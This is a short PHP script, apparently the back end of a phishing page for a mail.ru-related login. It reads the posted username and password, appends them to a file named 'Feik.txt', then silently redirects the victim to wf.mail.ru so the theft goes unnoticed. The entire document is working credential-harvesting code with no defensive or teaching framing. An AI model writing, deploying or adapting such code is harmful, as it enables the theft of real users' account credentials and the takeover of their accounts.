<?PHP
$Log = $_POST['username'];
$Pass =$_POST['password'];
$log = fopen("Feik.txt","at");
fwrite($log,"Nick- $Log:|Pass- $Pass:|Server- $Pas|\n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://wf.mail.ru'></head></html>";
?>